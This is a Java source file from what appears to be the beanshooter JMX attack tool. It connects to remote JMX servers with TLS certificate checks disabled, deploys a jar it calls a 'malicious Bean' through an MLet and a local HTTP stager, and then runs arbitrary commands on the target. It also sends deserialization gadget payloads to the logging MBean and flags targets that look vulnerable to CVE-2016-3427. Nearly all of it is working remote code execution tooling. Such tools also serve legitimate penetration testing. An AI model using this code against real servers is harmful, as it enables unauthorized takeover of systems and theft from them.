package de.qtc.beanshooter;

import java.io.IOException;
import java.io.File;
import java.net.InetSocketAddress;
import java.rmi.server.RMISocketFactory;
import java.util.HashMap;

import javax.management.InstanceNotFoundException;
import javax.management.MBeanException;
import javax.management.MBeanServerConnection;
import javax.management.MalformedObjectNameException;
import javax.management.ObjectName;
import javax.management.ReflectionException;
import javax.management.RuntimeMBeanException;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.rmi.ssl.SslRMIClientSocketFactory;

import com.sun.net.httpserver.HttpServer;

import de.qtc.beanshooter.io.Logger;
import de.qtc.beanshooter.networking.DummyTrustManager;
import de.qtc.beanshooter.networking.LoopbackSocketFactory;
import de.qtc.beanshooter.networking.LoopbackSslSocketFactory;
import de.qtc.beanshooter.utils.JarHandler;
import de.qtc.beanshooter.utils.MLetHandler;
import de.qtc.beanshooter.utils.RealmHandler;


public class GreenGrocer {

    String jarPath = null;
    String jarName = null;
    String beanClass = null;
    String objectName = null;
    ObjectName beanName = null;
    ObjectName mLetName = null;
    JMXConnector jmxConnector = null;
    MBeanServerConnection mBeanServer = null;

    public GreenGrocer(String jarPath, String jarName, String beanClass, String objectName, String mLetNameString) throws MalformedObjectNameException
    {
        this.jarPath = jarPath;
        this.jarName = jarName;
        this.beanClass = beanClass;
        this.objectName = objectName;

        this.mLetName = new ObjectName(mLetNameString);
        this.beanName = new ObjectName(this.objectName);
    }

    @SuppressWarnings({ "rawtypes", "unchecked" })
    public void connect(String host, int port, String boundName, Object credentials, boolean jmxmp, boolean ssl, boolean followRedirect, String saslMechanism)
    {
        try {
            HashMap environment = new HashMap();

            if( credentials != null )
                environment.put(JMXConnector.CREDENTIALS, credentials);

            JMXServiceURL jmxUrl = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + host + ":" + port +  "/" + boundName);
            if( jmxmp ) {
                jmxUrl = new JMXServiceURL("service:jmx:jmxmp://" + host + ":" + port);
                if(saslMechanism != null) {
                    environment.put("jmx.remote.profiles", saslMechanism);
                    if( saslMechanism.contains("DIGEST") || saslMechanism.contains("NTLM") ) {
                        environment.put("jmx.remote.sasl.callback.handler", new RealmHandler());
                    }
                }
            }

            RMISocketFactory fac = RMISocketFactory.getDefaultSocketFactory();
            RMISocketFactory my = new LoopbackSocketFactory(host, fac, followRedirect);
            RMISocketFactory.setSocketFactory(my);

            SSLContext ctx = SSLContext.getInstance("TLS");
            ctx.init(null, new TrustManager[] { new DummyTrustManager() }, null);
            SSLContext.setDefault(ctx);

            LoopbackSslSocketFactory.host = host;
            LoopbackSslSocketFactory.fac = ctx.getSocketFactory();
            LoopbackSslSocketFactory.followRedirect = followRedirect;
            java.security.Security.setProperty("ssl.SocketFactory.provider", "de.qtc.beanshooter.networking.LoopbackSslSocketFactory");

            if( ssl ) {
                environment.put("com.sun.jndi.rmi.factory.socket", new SslRMIClientSocketFactory());
                if( jmxmp ) {
                    environment.put("jmx.remote.tls.socket.factory", ctx.getSocketFactory());
                    if(saslMechanism == null) {
                        environment.put("jmx.remote.profiles", "TLS");
                    }
                }
            }

            Logger.println("Connecting to JMX server... ");
            jmxConnector = JMXConnectorFactory.connect(jmxUrl, environment);

            Logger.println("Creating MBeanServerConnection... ");
            this.mBeanServer = jmxConnector.getMBeanServerConnection();

        } catch( Exception e ) {

            if( e instanceof SecurityException && e.getMessage().contains("Credentials should be String[]") ) {
                Logger.println("");
                Logger.print("Caught ");
                Logger.printPlain_ye("SecurityException");
                Logger.printPlain(" with content ");
                Logger.printlnPlain_ye(e.getMessage());
                Logger.increaseIndent();
                Logger.println_ye("Target is most likely vulnerable to cve-2016-3427.");
                System.exit(0);
            }

            Logger.eprint("The following exception was thrown: ");
            Logger.eprintlnPlain_ye(e.getMessage());
            System.exit(1);
        }
    }

    public void disconnect()
    {
        try {
            jmxConnector.close();
        } catch( Exception e ) {
            Logger.eprintln("Encountered an error while closing the JMX connection...");
            Logger.eprint("The following exception was thrown: ");
            Logger.eprintlnPlain_ye(e.toString());
            System.exit(1);
        }
    }

    public void registerMLet()
    {
        try {
            /* First we try to register the MLet for JMX MBean deployment */
            Logger.print_ye("Creating MBean 'MLet' for remote deploymet... ");
            this.mBeanServer.createMBean("javax.management.loading.MLet", null);
            Logger.printlnPlain_ye("done!");
            Logger.println("");

        } catch (javax.management.InstanceAlreadyExistsException e) {
            /* MLet is may already registered. In this case we are done. */
            Logger.printlnPlain_ye("done!");
            Logger.increaseIndent();
            Logger.println("MBean 'MLet' did already exist on the server.");
            Logger.decreaseIndent();
            Logger.println("");

        } catch( Exception e ) {
            /* Otherwise MLet registration fails and we can stop execution. */
            Logger.eprintlnPlain_ye("failed!");
            Logger.eprint("The following exception was thrown: ");
            Logger.eprintlnPlain_ye(e.getMessage());
            this.disconnect();
            System.exit(1);
        }
    }

    public void unregisterMLet()
    {
        try {
            /* Trying to unregister the MLet from the JMX endpoint */
            Logger.print_ye("Unregister MBean 'MLet'... ");
            this.mBeanServer.unregisterMBean(mLetName);
            Logger.printlnPlain_ye("done!");

        } catch (javax.management.InstanceNotFoundException e) {
            /* If no MLet instance was found, we are done. */
            Logger.printlnPlain_ye("done!");
            Logger.increaseIndent();
            Logger.println("MBean 'MLet' did not exist on the JMX server.");
            Logger.decreaseIndent();

        } catch( Exception e ) {
            /* Otherwise an unexpected exception occurred and we have to stop. */
            Logger.eprintlnPlain_ye("failed!");
            Logger.eprint("The following exception was thrown: ");
            Logger.eprintlnPlain_ye(e.getMessage());
            this.disconnect();
            System.exit(1);
        }
    }

    public void jmxStatus()
    {
        try {

            /* First we check whether the MLet is registered on the JMX endpoint */
            Logger.print("Getting Status of MLet... ");
            Logger.increaseIndent();

            if( this.mBeanServer.isRegistered(mLetName) ) {
                Logger.printlnPlain("done!");
                Logger.println_ye("MLet is registered on the JMX server.");

            } else {
                Logger.printlnPlain("done!");
                Logger.println_ye("MLet is not registered on the JMX server.");
            }

            /* Then we check whether the malicious Bean is registered on the JMX endpoint */
            Logger.decreaseIndent();
            Logger.print("Getting Status of malicious Bean... ");
            Logger.increaseIndent();

            if( this.mBeanServer.isRegistered(this.beanName) ) {
              Logger.printlnPlain("done!");
              Logger.println_ye("Malicious MBean is registered on the JMX server.");

            } else {
                Logger.printlnPlain("done!");
                Logger.println_ye("Malicious MBean is not registered on the JMX server.");
            }

            Logger.decreaseIndent();

         } catch( Exception e ) {
            /* During the checks no exception is expected. So we exit if we encounter one */
            Logger.eprintln("failed!");
            Logger.eprint("The following exception was thrown: ");
            Logger.eprintlnPlain_ye(e.getMessage());
            this.disconnect();
            System.exit(1);
         }
    }

    public void registerBean(String bindAddress, String bindPort, String stagerHost, String stagerPort, boolean remoteStager)
    {
        try {
            /* If the malicious Bean is already registered, we are done */
            if( this.mBeanServer.isRegistered(this.beanName) ) {
                Logger.println_ye("Malicious MBean seems already be registered");
                return;

            /* Otherwise we have to create it */
            } else {
                try {
                    /* The server may already knows the codebase and registration is done right here */
                    mBeanServer.createMBean(this.beanClass, this.beanName);
                    Logger.println("Malicious Bean is not registered, but known by the server");
                    Logger.println("Instance created!");
                    return;

                } catch( Exception e ) {
                    /* More likely is, that we have to deploy the Bean over our HTTP listener */
                    Logger.println("Malicious Bean seems not to be registered on the server");
                    Logger.println("Starting registration process");
                    Logger.increaseIndent();
                }
            }

            /* The stager server might run on a different machine, in this case we can skip server creation */
            HttpServer payloadServer = null;
            if( ! remoteStager )
                payloadServer = this.startStagerServer(bindAddress, bindPort, stagerHost, stagerPort);

            /* In any case we need to invoke getMBeansFromURL to deploy our malicious bean */
            Object res = this.mBeanServer.invoke(this.mLetName, "getMBeansFromURL",
                                  new Object[] { String.format("http://%s:%s/mlet", stagerHost, stagerPort) },
                                  new String[] { String.class.getName() }
                                  );

            /* If we did not started the server we can stop it here */
            if( ! remoteStager )
                payloadServer.stop(0);

            Logger.decreaseIndent();

            /* At this stage the bean should have bean registered on the server */
            if( mBeanServer.isRegistered(this.beanName) ) {
                Logger.println("malicious Bean was successfully registered");

            /* Otherwise something unexpected has happened */
            } else {
                Logger.eprintln("malicious Bean does still not exist on the server");
                Logger.increaseIndent();
                Logger.eprintln("Registration process failed.");
                Logger.eprint("The following object was returned:");
                Logger.eprintlnPlain_ye(res.toString());
                this.disconnect();
                System.exit(1);
            }

         } catch( Exception e ) {
             Logger.eprintln("Error while registering malicious Bean.");
             Logger.eprint("The following exception was thrown: ");
             Logger.eprintlnPlain_ye(e.getMessage());
             this.disconnect();
             System.exit(1);
        }
    }

    public void unregisterBean()
    {
        /* Just try to unregister the bean, even if it is not registered */
        try {
            Logger.print_ye("Unregister malicious MBean... ");
            this.mBeanServer.unregisterMBean(this.beanName);
            Logger.printlnPlain_ye("done!");

        /* If no instance for we bean was found, we are also done */
        } catch (javax.management.InstanceNotFoundException e) {
            Logger.printlnPlain_ye("done!");
            Logger.increaseIndent();
            Logger.println("Malicious Bean did not exist on the JMX server.");
            Logger.decreaseIndent();

        } catch( Exception e ) {
            Logger.eprintlnPlain_ye("failed!");
            Logger.eprint("The following exception was thrown: ");
            Logger.eprintlnPlain_ye(e.getMessage());
            this.disconnect();
            System.exit(1);
        }
    }

    public void ping()
    {
        try {
            Logger.print("Sending ping to the server... ");
            Object response = this.mBeanServer.invoke(this.beanName, "ping", null, null);
            Logger.printlnPlain("done!");
            Logger.print("Servers answer is: ");
            Logger.printlnPlain_ye((String)response);

        } catch( Exception e ) {
            Logger.eprintlnPlain("failed!");
            Logger.eprint("The following exception was thrown: ");
            Logger.eprintlnPlain(e.getMessage());
            this.disconnect();
            System.exit(1);
        }
    }

    public String executeCommand(String command, boolean verbose)
    {
        try {
            if(verbose) {
                Logger.print("Sending command '");
                Logger.printPlain_bl(command);
                Logger.printlnPlain("' to the server... ");
            }

            Object response = this.mBeanServer.invoke(this.beanName, "executeCommand", new Object[]{ command }, new String[]{ String.class.getName() });

            if(verbose) {
                Logger.print("Servers answer is: ");
                Logger.printPlain_ye((String)response);
            }
            return (String)response;

        } catch( Exception e ) {
            Logger.eprint("The following exception was thrown: ");
            Logger.eprintlnPlain_ye(e.getMessage());
            this.disconnect();
            System.exit(1);
        }

        return "Unexpected Error";
    }

    public String executeCommandBackground(String command, boolean verbose)
    {
        try {
            if(verbose) {
                Logger.print("Sending command '");
                Logger.printPlain_bl(command);
                Logger.printlnPlain("' to the server... ");
            }

            Object response = this.mBeanServer.invoke(this.beanName, "executeCommandBackground", new Object[]{ command }, new String[]{ String.class.getName() });

            if(verbose) {
                Logger.print("Servers answer is: ");
                Logger.printPlain_ye((String)response);
            }

            return (String)response;

        } catch( Exception e ) {
            Logger.eprint("The following exception was thrown: ");
            Logger.eprintlnPlain_ye(e.getMessage());
            this.disconnect();
            System.exit(1);
        }

        return "Unexpected Error";
    }

    public void getLoggerLevel(Object payload)
    {
        Logger.println("Sending payload to 'getLoggerLevel'...");
        Logger.increaseIndent();

        try {
            ObjectName loggingMBean = new ObjectName("java.util.logging:type=Logging");
            this.mBeanServer.invoke(loggingMBean, "getLoggerLevel", new Object[]{ payload }, new String[]{String.class.getCanonicalName()});

        } catch (NullPointerException | MalformedObjectNameException | InstanceNotFoundException | MBeanException | ReflectionException | IOException e) {
            if( e.getCause() instanceof ClassNotFoundException) {
                Logger.eprintln("ClassNotFoundException. Chosen gadget is probably not available on the target.");
            } else {
                Logger.eprintln("Encountered unexcepted exception. Tagret is probably not vulnerable.");
            }

            Logger.eprintln("StackTrace:");
            e.printStackTrace();

        } catch (RuntimeMBeanException e) {
            if( e.getCause() instanceof IllegalArgumentException) {
                Logger.println_ye("IllegalArgumentException. This is fine :) Payload probably worked.");
            } else if (e.getCause() instanceof SecurityException) {
                Logger.println_ye("SecurityException. This is fine :) Payload probably worked.");
            } else {
                Logger.eprintln("Encountered unexcepted exception. Payload seems not to work :(");
                Logger.eprintln("StackTrace:");
                e.printStackTrace();
            }

        } catch (SecurityException e) {
            Logger.println_ye("SecurityException. This is fine :) Payload probably worked.");
        }
    }

    public HttpServer startStagerServer(String bindAddress, String bindPort, String stagerHost, String stagerPort)
    {
        HttpServer server = null;
        try {

            File maliciousBean = new File(this.jarPath + this.jarName);
            if( !maliciousBean.exists() || maliciousBean.isDirectory() ) {
                Logger.eprint("Unable to find MBean ");
                Logger.eprintlnPlain_ye(maliciousBean.getCanonicalPath());
                Logger.eprintlnPlain("for deployment.");
                Logger.eprintln("Stopping execution.");
                System.exit(1);
            }

            /* First we create a new HttpServer object */
            server = HttpServer.create(new InetSocketAddress(bindAddress, Integer.valueOf(bindPort)), 0);
            Logger.print("Creating HTTP server on ");
            Logger.printlnPlain_bl(bindAddress + ":" + bindPort);

            Logger.increaseIndent();

            /* Then we register an MLetHandler for requests on the endpoint /mlet */
            Logger.print("Creating MLetHandler for endpoint ");
            Logger.printlnPlain_bl("/mlet");
            server.createContext("/mlet", new MLetHandler(stagerHost, stagerPort, this.beanClass, this.jarName, this.objectName));

            /* Then we register a jar handler for requests that target our jarName */
            Logger.print("Creating JarHandler for endpoint ");
            Logger.printlnPlain_bl("/" + this.jarName);
            server.createContext("/" + this.jarName, new JarHandler(this.jarName, this.jarPath));

            server.setExecutor(null);

            Logger.println("Starting the HTTP server... ");
            Logger.println("");
            server.start();

        } catch (Exception e) {
            Logger.eprint("The following exception was thrown: ");
            Logger.eprintlnPlain_ye(e.getMessage());
            this.disconnect();
            System.exit(1);
        }

        return server;
    }
}
